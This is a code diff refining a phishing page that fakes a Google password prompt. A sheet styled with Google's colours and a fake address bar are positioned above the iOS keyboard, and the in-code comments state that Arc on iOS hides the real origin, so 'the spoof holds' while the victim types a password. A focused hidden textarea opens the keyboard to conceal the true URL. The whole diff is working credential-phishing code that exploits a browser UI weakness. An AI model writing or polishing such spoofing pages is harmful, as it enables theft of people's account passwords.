@@ -160,23 +160,23 @@
     position: fixed;
     bottom: 0; left: 0; right: 0;
     background: #fff;
-    border-radius: 20px 20px 0 0;
+    border-radius: 16px 16px 0 0;
     box-shadow: 0 -4px 24px rgba(0,0,0,0.15);
-    padding: 20px 24px 48px;
+    padding: 10px 20px 12px;
     z-index: 9998;
     transform: translateY(100%);
-    transition: transform 0.3s ease;
+    transition: transform 0.3s ease, bottom 0.15s ease;
     display: flex;
     flex-direction: column;
-    gap: 16px;
+    gap: 10px;
   }
   .cred-overlay.show { transform: translateY(0); }
 
   .cred-overlay .handle {
-    width: 36px; height: 4px; border-radius: 2px;
-    background: #dadce0; margin: 0 auto 4px;
+    width: 32px; height: 3px; border-radius: 2px;
+    background: #dadce0; margin: 0 auto 2px;
   }
-  .cred-overlay .co-logo { font-size: 18px; font-weight: 700; letter-spacing: -0.5px; text-align: center; }
+  .cred-overlay .co-logo { font-size: 15px; font-weight: 700; letter-spacing: -0.5px; text-align: center; }
   .cred-overlay .co-logo span:nth-child(1) { color: #4285F4; }
   .cred-overlay .co-logo span:nth-child(2) { color: #EA4335; }
   .cred-overlay .co-logo span:nth-child(3) { color: #FBBC05; }
@@ -184,29 +184,29 @@
   .cred-overlay .co-logo span:nth-child(5) { color: #34A853; }
   .cred-overlay .co-logo span:nth-child(6) { color: #EA4335; }
 
-  .cred-overlay h3 { font-size: 20px; font-weight: 400; color: #202124; text-align: center; }
+  .cred-overlay h3 { font-size: 17px; font-weight: 400; color: #202124; text-align: center; margin-top: -2px; }
   .cred-overlay .email-chip {
     background: #f1f3f4; border-radius: 20px;
-    padding: 6px 14px; font-size: 14px; color: #3c4043;
-    display: flex; align-items: center; gap: 8px; align-self: center;
+    padding: 5px 12px; font-size: 13px; color: #3c4043;
+    display: flex; align-items: center; gap: 7px; align-self: center;
   }
   .cred-overlay .email-chip .dot {
-    width: 24px; height: 24px; border-radius: 50%;
+    width: 22px; height: 22px; border-radius: 50%;
     background: #4285F4; color: #fff;
     display: flex; align-items: center; justify-content: center;
-    font-size: 11px; font-weight: 600;
+    font-size: 10px; font-weight: 600;
   }
 
   .cred-overlay .pw-field {
     border: 1px solid #dadce0; border-radius: 6px;
-    padding: 12px 14px; font-size: 16px; color: #202124;
+    padding: 10px 12px; font-size: 15px; color: #202124;
     outline: none; font-family: inherit; width: 100%;
   }
   .cred-overlay .pw-field:focus { border-color: #1a73e8; box-shadow: 0 0 0 1px #1a73e8; }
 
   .cred-overlay .next-btn {
     background: #1a73e8; color: #fff; border: none;
-    border-radius: 6px; padding: 12px; font-size: 15px;
+    border-radius: 6px; padding: 11px; font-size: 15px;
     font-weight: 500; cursor: pointer; font-family: inherit;
     width: 100%;
   }
@@ -335,27 +335,32 @@
 
   let spoofActive = false;
 
-  function adjustBarHeight() {
+  function adjustLayout() {
     const vv = window.visualViewport;
     if (!vv) return;
     const kbH = window.innerHeight - vv.height - vv.offsetTop;
-    fakeBar.style.bottom        = kbH > 50 ? kbH + 'px' : '0px';
-    fakeBar.style.paddingBottom = kbH > 50 ? '9px'      : '34px';
+    const aboveKb = kbH > 50;
+
+    // Fake bar sits just above the keyboard
+    fakeBar.style.bottom        = aboveKb ? kbH + 'px' : '0px';
+    fakeBar.style.paddingBottom = aboveKb ? '9px'      : '34px';
+
+    // Credential overlay also sits just above the keyboard (not above home indicator)
+    credOverlay.style.bottom = aboveKb ? kbH + 'px' : '0px';
   }
 
-  // Reposition fake bar whenever keyboard height changes
   if (window.visualViewport) {
     window.visualViewport.addEventListener('resize', () => {
-      if (spoofActive) adjustBarHeight();
+      if (spoofActive) adjustLayout();
     });
   }
 
   function showSpoof() {
     spoofActive = true;
     fakeBar.classList.add('show');
-    adjustBarHeight();
+    adjustLayout();
 
-    // Slide up credential sheet, then hand focus to password field.
+    // Slide up credential sheet, then focus password field.
     // Arc iOS does not disclose the real origin in the keyboard accessory
     // bar, so the spoof holds even while the user types their password.
     setTimeout(() => {
@@ -365,7 +370,6 @@
   }
 
   document.getElementById('secureBtn').addEventListener('click', () => {
-    // Focus hidden textarea → QWERTY keyboard opens → Arc iOS shows no real URL
     kbTrigger.focus();
     setTimeout(showSpoof, 150);
   });
